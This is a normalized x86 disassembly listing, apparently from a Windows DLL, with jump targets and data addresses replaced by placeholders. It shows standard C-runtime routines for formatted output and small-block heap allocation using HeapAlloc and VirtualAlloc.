add esp 0xc
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
movsx eax bl
push eax
call sub_1000bc65
mov bl [ esi ]
add esp 0xc
inc esi
mov [ ebp + 0xc ] esi
sub eax 0x69
je r-xdata
cmp eax 0x65
jge r-xdata
or [ ebp - 0x4 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
mov [ ebp - 0x28 ] eax
jmp r-xdata
or [ ebp - 0x4 ] 0x4
neg eax
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
and [ ebp - 0x3c ] 0x0
cmp [ esi + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x4 ] 0x20
jmp r-xdata
cmp bl 0x6c
je r-xdata
or [ ebp - 0x4 ] 0x40
sub eax 0x5
je r-xdata
or [ ebp - 0x4 ] 0x40
cmp [ ebp - 0x8 ] 0x0
lea edi [ ebp - 0x24c ]
mov [ ebp - 0xc ] edi
jge r-xdata
cmp eax 0x58
jg r-xdata
or [ ebp - 0x4 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
inc esi
inc esi
or [ ebp - 0x3 ] 0x80
mov [ ebp + 0xc ] esi
jmp r-xdata
or [ ebp - 0x4 ] 0x10
jmp r-xdata
cmp bl 0x77
jne r-xdata
test [ ebp - 0x4 ] 0x20
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_1000bd10
pop ecx
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_1000bd03
test [ ebp - 0x4 ] 0x20
pop ecx
je r-xdata
dec eax
je r-xdata
jne r-xdata
mov [ ebp - 0x8 ] 0x6
jmp r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ebp - 0x4 ] edi
jmp r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
test [ ebp - 0x4 ] 0x40
je r-xdata
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
mov cx [ ebp - 0x14 ]
mov [ eax ] cx
jmp r-xdata
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0x10 ] 0x8
je r-xdata
dec eax
je r-xdata
cmp [ ebp - 0x8 ] edx
jle r-xdata
cmp bl 0x67
jne r-xdata
mov eax [ ebp + 0x10 ]
push [ ebp - 0x40 ]
add eax 0x8
mov [ ebp + 0x10 ] eax
push [ ebp - 0x8 ]
mov ecx [ eax - 0x8 ]
mov [ ebp - 0x4c ] ecx
mov eax [ eax - 0x4 ]
mov [ ebp - 0x48 ] eax
movsx eax bl
push eax
lea eax [ ebp - 0x4c ]
push edi
push eax
call [ rw-data ]
mov esi [ ebp - 0x4 ]
add esp 0x14
and esi 0x80
je r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_1000bd03
test eax eax
pop ecx
je r-xdata
sub eax 0x9
je r-xdata
mov [ ebp - 0x34 ] 0x7
sub eax 0x43
je r-xdata
or [ ebp - 0x4 ] 0x8
jmp r-xdata
call sub_1000bd03
pop ecx
xor edx edx
call sub_1000bd03
pop ecx
jmp r-xdata
call sub_1000bd03
pop ecx
movzx eax ax
jmp r-xdata
call sub_1000bd03
pop ecx
movsx eax ax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
test edx edx
jg r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
mov [ ebp - 0x38 ] 0x1
jmp r-xdata
test [ ebp - 0x3 ] 0x80
je r-xdata
or [ ebp - 0x4 ] edx
jmp r-xdata
mov [ ebp - 0x8 ] 0x8
sub eax 0x3
je r-xdata
cmp [ ebp - 0x8 ] 0xa3
jle r-xdata
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
cmp bl 0x67
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
push eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
test [ ebp - 0x4 ] 0x810
lea eax [ ebp + 0x10 ]
push eax
je r-xdata
dec eax
je r-xdata
mov al [ ebp - 0x34 ]
mov [ ebp - 0x16 ] 0x30
add al 0x51
mov [ ebp - 0x24 ] 0x2
mov [ ebp - 0x15 ] al
jmp r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cdq
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
and [ ebp - 0x1c ] 0x0
jl r-xdata
push [ ebp - 0x30 ]
call sub_10009e3d
and [ ebp - 0x30 ] 0x0
pop ecx
cmp [ ebp - 0x8 ] 0xffffffff
mov esi 0x7fffffff
je r-xdata
dec eax
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x15d
push eax
call sub_100096ed
test eax eax
pop ecx
mov [ ebp - 0x30 ] eax
je r-xdata
cmp [ edi ] 0x2d
jne r-xdata
test esi esi
jne r-xdata
push edi
call [ rw-data ]
pop ecx
call sub_1000d910
pop ecx
jmp r-xdata
test [ ebp - 0x4 ] edi
je r-xdata
call sub_1000bd03
pop ecx
mov [ ebp - 0x24c ] al
mov [ ebp - 0x10 ] 0x1
call sub_1000bd20
push eax
lea eax [ ebp - 0x24c ]
push eax
call sub_10010064
add esp 0xc
mov [ ebp - 0x10 ] eax
test eax eax
jge r-xdata
jmp r-xdata
or [ ebp - 0x4 ] edi
mov [ ebp - 0x40 ] 0x1
add bl 0x20
dec eax
dec eax
je r-xdata
and [ ebp - 0x4 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x8 ] eax
jle r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
mov [ ebp - 0x20 ] eax
neg edx
or [ ebp - 0x3 ] 0x1
mov [ ebp - 0x1c ] edx
jmp r-xdata
test eax eax
jae r-xdata
lea eax [ ebp + 0x10 ]
push eax
call sub_1000bd03
test [ ebp - 0x4 ] 0x810
pop ecx
mov ecx eax
mov [ ebp - 0xc ] ecx
je r-xdata
mov esi [ ebp - 0x8 ]
mov [ ebp - 0x10 ] 0xa
sub eax 0x3
jne r-xdata
mov [ ebp - 0x8 ] 0xa3
mov edi eax
mov [ ebp - 0xc ] edi
jmp r-xdata
push edi
or [ ebp - 0x3 ] 0x1
inc edi
mov [ ebp - 0xc ] edi
push edi
call [ rw-data ]
pop ecx
mov [ ebp - 0x10 ] eax
and [ ebp - 0x2c ] 0x0
mov [ ebp - 0xc ] ecx
movsx eax [ eax ]
jmp r-xdata
movsx eax [ eax ]
shr eax 0x1
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x2c ] 0x1
jmp r-xdata
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
lea eax [ ebp - 0x24c ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ ebp - 0x38 ] 0x1
jmp r-xdata
sub eax 0xc
jne r-xdata
mov eax [ ebp - 0x20 ]
or eax [ ebp - 0x1c ]
jne r-xdata
mov [ ebp - 0x8 ] eax
test [ ebp - 0x3 ] 0x80
jne r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
mov [ ebp - 0x34 ] 0x27
jmp r-xdata
mov ebx [ ebp - 0x4 ]
test bl 0x40
je r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
lea eax [ ebp - 0x4d ]
mov [ ebp - 0xc ] eax
and [ ebp - 0x24 ] 0x0
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x2c ] 0x1
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0xc ] ecx
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0x10 ] 0x10
je r-xdata
mov esi [ ebp - 0x28 ]
sub esi [ ebp - 0x24 ]
sub esi [ ebp - 0x10 ]
test bl 0xc
jne r-xdata
test bh 0x1
je r-xdata
or [ ebp - 0x4 ] edi
mov eax [ ebp - 0x10 ]
cdq
mov edi edx
mov esi eax
push edi
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call sub_1000e920
push edi
push esi
push [ ebp - 0x1c ]
mov ebx eax
add ebx 0x30
push [ ebp - 0x20 ]
call sub_1000e8b0
cmp ebx 0x39
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
jle r-xdata
mov eax [ ebp - 0x20 ]
or eax [ ebp - 0x1c ]
je r-xdata
sub eax ecx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
sub eax ecx
sar eax 0x1
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x16 ]
push [ ebp + 0x8 ]
push [ ebp - 0x24 ]
push eax
call sub_1000bccb
add esp 0x10
test bl 0x8
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_1000bc9a
add esp 0x10
test bl 0x1
je r-xdata
mov [ ebp - 0x16 ] 0x2d
jmp r-xdata
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
mov [ eax ] bl
jmp r-xdata
add ebx [ ebp - 0x34 ]
lea eax [ ebp - 0x4d ]
sub eax [ ebp - 0xc ]
inc [ ebp - 0xc ]
test [ ebp - 0x3 ] 0x2
mov [ ebp - 0x10 ] eax
je r-xdata
inc eax
jmp r-xdata
inc eax
inc eax
jmp r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
mov [ ebp - 0x16 ] 0x2b
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
mov eax [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
test eax eax
jg r-xdata
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0x30
jne r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
call sub_1000bccb
add esp 0x10
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x30
call sub_1000bc9a
add esp 0x10
mov [ ebp - 0x16 ] 0x20
dec [ ebp - 0xc ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] 0x30
test eax eax
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_1000bc9a
add esp 0x10
mov eax [ ebp - 0x10 ]
mov ebx [ ebp - 0xc ]
lea edi [ eax - 0x1 ]
test [ ebp - 0x4 ] 0x4
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
push [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call sub_1000bccb
add esp 0x10
mov eax edi
dec edi
test eax eax
jne r-xdata
mov ax [ ebx ]
inc ebx
push eax
lea eax [ ebp - 0x44 ]
push eax
inc ebx
call sub_10010064
pop ecx
test eax eax
pop ecx
jle r-xdata
jmp r-xdata
sub_1000bc65
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
dec [ ecx + 0x4 ]
js r-xdata
push ecx
push [ ebp + 0x8 ]
call sub_1000b3af
pop ecx
pop ecx
mov edx [ ecx ]
mov al [ ebp + 0x8 ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ eax ]
pop ebp
retn
or [ eax ] 0xffffffff
pop ebp
retn
cmp eax 0xffffffff
mov eax [ ebp + 0x10 ]
jne r-xdata
sub_1000bc9a
push esi
push edi
mov edi [ esp + 0x10 ]
mov eax edi
dec edi
test eax eax
jle r-xdata
pop edi
pop esi
retn
mov esi [ esp + 0x18 ]
mov eax edi
dec edi
test eax eax
jg r-xdata
push esi
push [ esp + 0x18 ]
push [ esp + 0x14 ]
call sub_1000bc65
add esp 0xc
cmp [ esi ] 0xffffffff
je r-xdata
sub_1000bccb
push ebx
mov ebx [ esp + 0xc ]
mov eax ebx
dec ebx
push esi
push edi
test eax eax
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esp + 0x1c ]
mov esi [ esp + 0x10 ]
mov eax ebx
dec ebx
test eax eax
jg r-xdata
movsx eax [ esi ]
push edi
inc esi
push [ esp + 0x1c ]
push eax
call sub_1000bc65
add esp 0xc
cmp [ edi ] 0xffffffff
je r-xdata
sub_1000bd2e
push 0x140
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov ecx [ esp + 0x4 ]
and [ rw-data ] 0x0
and [ rw-data ] 0x0
push 0x1
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] 0x10
pop eax
retn
retn
sub_1000bd76
mov eax [ rw-data ]
lea ecx [ eax + eax * 4 ]
mov eax [ rw-data ]
lea ecx [ eax + ecx * 4 ]
xor eax eax
mov edx [ esp + 0x4 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
retn
add eax 0x14
jmp r-xdata
cmp eax ecx
jae r-xdata
sub_1000bda1
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ ecx + 0x10 ]
push edi
mov edi esi
add esi 0xfffffffc
sub edi [ ecx + 0xc ]
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
test cl 0x1
mov [ ebp - 0x4 ] ecx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov edx [ ecx + esi ]
lea ebx [ ecx + esi ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
test dl 0x1
mov [ ebp + 0xc ] ebx
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov ecx [ ebp - 0x4 ]
cmp edx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
mov ebx [ ecx + edx * 8 + 0x4 ]
lea ecx [ ecx + edx * 8 ]
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ecx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
mov [ ebp - 0x4 ] ecx
sar edx 0x4
dec edx
cmp edx esi
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
cmp edx 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ edx + eax + 0x4 ] cl
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ecx [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ rw-data ] edi
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push 0x4000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov eax [ eax + 0x10 ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ebx 0x80000000
mov ecx edx
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
cmp ebx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
mov esi 0x80000000
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov esi 0x80000000
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov eax [ rw-data ]
mov edx [ rw-data ]
lea eax [ eax + eax * 4 ]
shl eax 0x2
mov ecx eax
mov eax [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_10009830
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_1000c0ca
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov edx [ rw-data ]
push ebx
push esi
lea eax [ eax + eax * 4 ]
push edi
lea edi [ edx + eax * 4 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
lea ecx [ eax + 0x17 ]
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
dec ecx
cmp ecx 0x20
jge r-xdata
add ecx 0xffffffe0
or eax 0xffffffff
xor esi esi
shr eax cl
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] eax
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov eax [ rw-data ]
mov ebx eax
cmp ebx edi
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
cmp edx 0xffffffff
mov [ ebp - 0x4 ] edx
je r-xdata
mov ebx edx
add ebx 0x14
cmp ebx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov edx [ eax + 0xc4 ]
mov esi [ eax + 0x44 ]
and edx [ ebp - 0x8 ]
and esi [ ebp - 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ eax + 0x44 ]
or edx esi
mov esi [ ebp - 0xc ]
jne r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
inc [ ebp - 0x4 ]
and edx [ ebp - 0x8 ]
add ecx 0x4
mov edi esi
and edi [ ecx ]
or edx edi
je r-xdata
mov ecx edx
xor edi edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
and ecx esi
jne r-xdata
cmp ebx [ ebp - 0x4 ]
jae r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
test ecx ecx
jl r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
push 0x20
and ecx [ ebp - 0x8 ]
pop edi
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
mov [ ebp - 0x8 ] ecx
sar esi 0x4
dec esi
cmp esi 0x3f
jle r-xdata
shl ecx 0x1
inc edi
jmp r-xdata
push ebx
call sub_1000c484
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
jne r-xdata
mov ebx edx
cmp ebx [ ebp - 0x4 ]
add ebx 0x14
mov [ ebp + 0x8 ] ebx
jmp r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
xor eax eax
jmp r-xdata
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_1000c3d3
mov ebx eax
test ebx ebx
mov [ ebp + 0x8 ] ebx
je r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
test ecx ecx
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
cmp [ ebp - 0x8 ] 0x0
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
jge r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ edx + 0x4 ] edi
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xb ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx ] ecx
jmp r-xdata
and [ rw-data ] 0x0
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_1000c3d3
mov eax [ rw-data ]
mov ecx [ rw-data ]
push esi
push edi
xor edi edi
cmp eax ecx
jne r-xdata
mov ecx [ rw-data ]
push 0x41c4
push 0x8
lea eax [ eax + eax * 4 ]
push [ rw-data ]
lea esi [ ecx + eax * 4 ]
call [ HeapAlloc@IAT ]
cmp eax edi
mov [ esi + 0x10 ] eax
je r-xdata
lea eax [ ecx + ecx * 4 + 0x50 ]
shl eax 0x2
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
cmp eax edi
mov [ esi + 0xc ] eax
jne r-xdata
add [ rw-data ] 0x10
mov [ rw-data ] eax
mov eax [ rw-data ]
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
sub_1000c484
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi [ ecx + 0x10 ]
mov eax [ ecx + 0x8 ]
xor ebx ebx
mov eax ebx
push 0x3f
imul eax eax 0x204
pop edx
lea eax [ eax + esi + 0x144 ]
mov [ ebp - 0x4 ] eax
shl eax 0x1
inc ebx
jmp r-xdata
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
mov edi ebx
push 0x4
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x1000
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
test eax eax
jl r-xdata
lea edx [ edi + 0x7000 ]
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
lea ecx [ edi + 0xc ]
add eax 0x1f8
push 0x1
pop edi
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
lea eax [ edi + 0x10 ]
pop edi
pop esi
pop ebx
leave
retn
